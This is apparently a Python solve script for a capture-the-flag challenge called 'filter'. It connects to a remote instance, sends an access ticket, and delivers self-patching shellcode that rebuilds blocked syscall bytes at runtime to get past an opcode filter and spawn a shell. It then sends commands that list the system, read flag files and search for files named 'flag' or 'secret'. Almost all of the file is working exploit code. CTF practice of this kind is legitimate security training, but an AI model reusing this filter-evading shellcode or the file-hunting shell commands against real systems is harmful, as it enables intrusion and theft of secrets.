#!/usr/bin/env python3
"""CTFCUP 2026 / filter: self-patching shellcode + gateway ticket.

Run: python3 solve_filter_remote.py
Options: --host, --port, --ticket, --no-ticket, --timeout
"""
import argparse
import select
import socket
import struct
import sys
import time

SHELLCODE = bytes.fromhex(
    "31c050488d3d15000000574889e631d2b03b488d1d04000000c603050f04c32f62696e2f736800"
)
assert len(SHELLCODE) == 39
assert not any(part in SHELLCODE for part in (b"\x0f\x05", b"\xcd\x80", b"\x0f\x34"))
FRAME = struct.pack("<I", len(SHELLCODE)) + SHELLCODE

COMMANDS = b"""\necho FILTER_SHELL_OK
id
pwd
ls -la
for f in /flag /flag.txt ./flag ./flag.txt /app/flag /app/flag.txt /home/ctf/flag /home/ctf/flag.txt /challenge/flag.txt; do
  if [ -f "$f" ]; then echo "[+] FLAG CANDIDATE: $f"; cat "$f"; echo; fi
done
find / -maxdepth 4 -type f \\( -iname '*flag*' -o -iname '*secret*' \\) 2>/dev/null | head -40
exit
"""


def recv_until_quiet(s, *, wait=1.2, deadline=None):
    """Receive all currently available bytes, leaving connection open."""
    result = bytearray()
    while True:
        left = wait if deadline is None else min(wait, max(0.0, deadline - time.monotonic()))
        if left <= 0:
            break
        ready, _, _ = select.select([s], [], [], left)
        if not ready:
            break
        try:
            part = s.recv(65536)
        except (TimeoutError, ConnectionResetError):
            break
        if not part:
            break
        result += part
        sys.stdout.buffer.write(part)
        sys.stdout.buffer.flush()
        if b"Send your shellcode" in result:
            break
    return bytes(result)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="instances.ctfcup.online")
    ap.add_argument("--port", type=int, default=1337)
    ap.add_argument("--ticket", default="PYINKI2EQHVINDHK9983QPKDWXKOPT4G")
    ap.add_argument("--no-ticket", action="store_true", help="direct instance: do not send the gateway ticket")
    ap.add_argument("--timeout", type=float, default=20)
    args = ap.parse_args()
    deadline = time.monotonic() + args.timeout
    with socket.create_connection((args.host, args.port), timeout=10) as s:
        s.settimeout(3)
        intro = recv_until_quiet(s, wait=1.7, deadline=deadline)
        challenge_ready = b"Send your shellcode" in intro

        # Only transmit ticket when the remote is not already serving the challenge.
        if not challenge_ready and not args.no_ticket:
            print("[client] Sending instance ticket", file=sys.stderr, flush=True)
            s.sendall(args.ticket.encode("ascii") + b"\n")
            while time.monotonic() < deadline and not challenge_ready:
                part = recv_until_quiet(s, wait=1.5, deadline=deadline)
                if not part:
                    break
                if b"Send your shellcode" in part:
                    challenge_ready = True
                if b"not found" in part.lower() or b"invalid token" in part.lower():
                    raise RuntimeError("Gateway rejected the ticket")
        if not challenge_ready:
            print("[client] Challenge prompt not seen; will send payload anyway", file=sys.stderr, flush=True)
        print("[client] Sending frame and shell commands", file=sys.stderr, flush=True)
        s.sendall(FRAME + COMMANDS)
        while time.monotonic() < deadline:
            ready, _, _ = select.select([s], [], [], min(3.0, max(0.0, deadline - time.monotonic())))
            if not ready:
                continue
            part = s.recv(65536)
            if not part:
                break
            sys.stdout.buffer.write(part)
            sys.stdout.buffer.flush()


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError) as exc:
        print("[client] ERROR:", exc, file=sys.stderr)
        sys.exit(1)
